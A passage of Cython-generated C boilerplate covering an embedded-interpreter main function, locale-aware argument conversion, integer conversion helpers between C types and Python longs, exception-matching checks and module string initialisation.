          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
